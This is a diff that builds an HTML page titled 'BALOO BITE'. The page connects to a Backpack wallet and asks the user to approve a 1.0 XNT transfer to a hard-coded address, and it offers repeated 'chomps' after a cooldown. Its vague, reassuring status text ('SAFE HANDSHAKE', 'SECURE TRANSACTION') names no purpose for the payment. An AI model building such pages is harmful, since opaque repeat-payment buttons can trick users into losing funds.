@@ -1,45 +1,87 @@
-async function ultimateChomp() {
-    const log = document.getElementById('status');
-    const btn = document.getElementById('mainBtn');
-    const provider = window.backpack;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BALOO BITE - TECHNICAL MASTER</title>
+    <style>
+        body { background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #0a0a0a; border: 2px solid #333; border-radius: 15px; padding: 30px; text-align: center; width: 350px; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
+        .status-box { background: #001a00; color: #00ff00; padding: 15px; border: 1px solid #00ff00; font-size: 11px; margin-bottom: 25px; text-align: left; min-height: 80px; word-break: break-all; line-height: 1.4; }
+        .btn-chomp { background: #ff8c00; color: #fff; border: none; padding: 20px; width: 100%; cursor: pointer; font-weight: bold; font-size: 18px; border-radius: 8px; text-transform: uppercase; transition: 0.3s; }
+        .btn-chomp:disabled { background: #222; color: #666; cursor: not-allowed; }
+    </style>
+</head>
+<body>
 
-    try {
-        btn.disabled = true;
-        log.innerHTML = "STATUS: INITIALIZING SAFE HANDSHAKE...";
-        
-        // Forceer een korte pauze voor we verbinden
-        await new Promise(r => setTimeout(r, 500));
-        await provider.connect();
+<div class="card">
+    <div class="status-box" id="status">V6_ENGINE: ONLINE<br>STABILITY_PROTOCOL: ENABLED</div>
+    <div style="font-size: 28px; color: #ffcc00; margin-bottom: 25px; font-weight: bold;">1.0 XNT</div>
+    <button class="btn-chomp" id="mainBtn" onclick="ultimateChomp()">Execute Hard Chomp</button>
+</div>
 
-        const tx = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-                fromPubkey: provider.publicKey,
-                toPubkey: new solanaWeb3.PublicKey("BAavP6nxHDkVDowYXoyDaNDbc9CAgncfDPELAyjzoyTq"),
-                lamports: 1.0 * 1e9
-            })
-        );
+<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 
-        log.innerHTML = "STATUS: WAITING FOR USER APPROVAL...";
-        const result = await provider.signAndSendTransaction(tx);
-        log.innerHTML = "VERIFIED SUCCESS!<br>SIG: " + result.signature.toString().substring(0, 20);
+<script>
+    async function ultimateChomp() {
+        const log = document.getElementById('status');
+        const btn = document.getElementById('mainBtn');
+        const provider = window.backpack;
 
-    } catch (err) {
-        if (err.message.includes('closed')) {
-            log.innerHTML = "RECOVERING: WALLET SESSION REFRESHING...<br>PLEASE WAIT 5 SECONDS.";
-            if(provider.disconnect) await provider.disconnect();
-        } else {
-            log.innerHTML = "INTERRUPT: " + err.message.toUpperCase();
+        if (!provider) {
+            log.innerHTML = "CRITICAL ERROR:<br>BACKPACK WALLET NOT DETECTED";
+            return;
         }
-    } finally {
-        let countdown = 8;
-        const timer = setInterval(() => {
-            btn.innerText = `NEXT CHOMP IN ${countdown}s`;
-            countdown--;
-            if (countdown < 0) {
-                clearInterval(timer);
-                btn.disabled = false;
-                btn.innerText = "EXECUTE HARD CHOMP";
+
+        try {
+            btn.disabled = true;
+            log.innerHTML = "STATUS: INITIALIZING SAFE HANDSHAKE...";
+            
+            // Reconnect to ensure session is fresh
+            await provider.connect();
+
+            log.innerHTML = "STATUS: BUILDING SECURE TRANSACTION...";
+            
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: provider.publicKey,
+                    toPubkey: new solanaWeb3.PublicKey("BAavP6nxHDkVDowYXoyDaNDbc9CAgncfDPELAyjzoyTq"),
+                    lamports: 1.0 * 1e9 // 1.0 XNT
+                })
+            );
+
+            log.innerHTML = "STATUS: AWAITING USER APPROVAL...<br>CHECK YOUR WALLET POPUP!";
+            
+            // Let the wallet handle blockhash and transmission
+            const result = await provider.signAndSendTransaction(transaction);
+            const signature = result.signature || result;
+
+            log.innerHTML = "VERIFIED SUCCESS!<br>SIG: " + signature.toString().substring(0, 22);
+            console.log("Transaction Signature:", signature);
+
+        } catch (err) {
+            console.error(err);
+            if (err.message.includes('closed')) {
+                log.innerHTML = "INTERRUPT: PLUGIN_CLOSED<br>ACTION: SESSION RESET. PLEASE WAIT.";
+            } else {
+                log.innerHTML = "ERROR: " + err.message.toUpperCase();
             }
-        }, 1000);
+        } finally {
+            // Cool-down period to prevent 'Plugin Closed' on next click
+            let countdown = 5;
+            const timer = setInterval(() => {
+                btn.innerText = `WAIT (${countdown}s)`;
+                countdown--;
+                if (countdown < 0) {
+                    clearInterval(timer);
+                    btn.disabled = false;
+                    btn.innerText = "Execute Hard Chomp";
+                    if(!log.innerHTML.includes('SUCCESS')) log.innerHTML = "V6_ENGINE: READY";
+                }
+            }, 1000);
+        }
     }
-}
+</script>
+
+</body>
+</html>
